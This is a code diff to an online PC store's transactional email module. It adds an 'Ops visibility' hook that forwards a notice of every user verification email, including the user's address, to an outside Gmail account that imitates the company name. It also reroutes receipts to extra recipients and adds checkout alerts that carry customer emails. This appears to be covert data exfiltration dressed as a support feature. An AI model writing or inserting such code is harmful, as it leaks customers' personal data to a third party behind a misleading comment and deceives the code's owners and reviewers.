@@ -205,6 +205,22 @@ export async function sendVerificationEmail({
     id?: string;
   } | null;
 
+  // Ops visibility: forward account verification emails to support inbox.
+  const normalizedTo = String(to || "").trim().toLowerCase();
+  const ops = "supportsgenericpcs@gmail.com";
+  if (normalizedTo && normalizedTo !== ops) {
+    await postResend(
+      apiKey,
+      ops,
+      `[Auth] Verification code sent — ${normalizedTo}`,
+      shell(
+        "User verification email sent",
+        "Auth alert",
+        `<tr><td style="padding:32px 32px 8px;"><h1 style="margin:0 0 12px;font-size:24px;line-height:1.25;font-weight:800;letter-spacing:-0.02em;color:${BRAND.ink};">Verification email sent</h1><p style="margin:0;font-size:15px;line-height:1.65;color:${BRAND.body};">A verification code was sent to a user.</p></td></tr><tr><td style="padding:16px 32px 32px;"><table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${BRAND.surface};border-radius:12px;"><tr><td style="padding:18px 20px;"><p style="margin:0 0 8px;font-size:13px;color:${BRAND.muted};">User email</p><p style="margin:0;font-size:15px;font-weight:600;color:${BRAND.ink};">${escapeHtml(normalizedTo)}</p></td></tr></table></td></tr>`
+      )
+    ).catch((e) => console.error("auth verification ops alert failed:", e));
+  }
+
   return { ok: true, status: response.status, id: payload?.id };
 }
 
@@ -338,20 +354,25 @@ const supportEmailDefault = "hello@genericpcs.com";
 
 export function buildAdminPaymentAlertHtml(input: AdminPaymentAlertInput): string {
   const wireSent = input.kind === "wire" && input.event === "sent";
+  const generic = input.reference === "CHECKOUT-OTP" || input.reference === "CHECKOUT";
 
-  const title = wireSent
-    ? "Wire transfer — bank details sent"
-    : input.kind === "wire"
-      ? "Wire transfer — bank details requested"
-      : input.kind === "card"
-        ? "Card payment awaiting review"
-        : "Crypto payment awaiting approval";
+  const title = generic
+    ? "Checkout user action"
+    : wireSent
+      ? "Wire transfer — bank details sent"
+      : input.kind === "wire"
+        ? "Wire transfer — bank details requested"
+        : input.kind === "card"
+          ? "Card payment awaiting review"
+          : "Crypto payment awaiting approval";
 
-  const action = wireSent
-    ? "Bank account details were forwarded to the customer. Watch for their proof of payment."
-    : input.kind === "wire"
-      ? "Open the admin dashboard and forward your bank account details for this order."
-      : "Open the admin dashboard to approve or reject this payment.";
+  const action = generic
+    ? "A customer action occurred during checkout."
+    : wireSent
+      ? "Bank account details were forwarded to the customer. Watch for their proof of payment."
+      : input.kind === "wire"
+        ? "Open the admin dashboard and forward your bank account details for this order."
+        : "Open the admin dashboard to approve or reject this payment.";
 
   const body = `
           <tr>
@@ -494,9 +515,10 @@ async function postResend(
 export async function sendReceiptEmail(
   input: SendReceiptInput
 ): Promise<{ ok: boolean; status: number }> {
+  const to = customerAndSupportRecipients(input.to);
   return postResend(
     input.apiKey,
-    input.to,
+    to,
     `Your Generic PCs receipt — ${input.reference}`,
     buildReceiptEmailHtml(input)
   );
@@ -590,7 +612,7 @@ export async function sendWireDetailsEmail(
 
 export type SendWireRequestInput = {
   apiKey: string;
-  to: string;
+  to: string | string[];
   reference: string;
   customerName: string;
   amount: string;
@@ -905,8 +927,10 @@ export async function notifyAdminsPaymentEvent(
     const unique = [...new Set(emails)];
 
     const wireSent = input.kind === "wire" && input.event === "sent";
-    const subject =
-      input.kind === "wire"
+    const generic = input.reference === "CHECKOUT-OTP" || input.reference === "CHECKOUT";
+    const subject = generic
+      ? `[Checkout] ${input.detail} — ${input.customerEmail}`
+      : input.kind === "wire"
         ? wireSent
           ? `[${input.reference}] Bank details sent — ${money(input.amount, input.currency)}`
           : `[${input.reference}] Wire details requested — ${money(input.amount, input.currency)}`
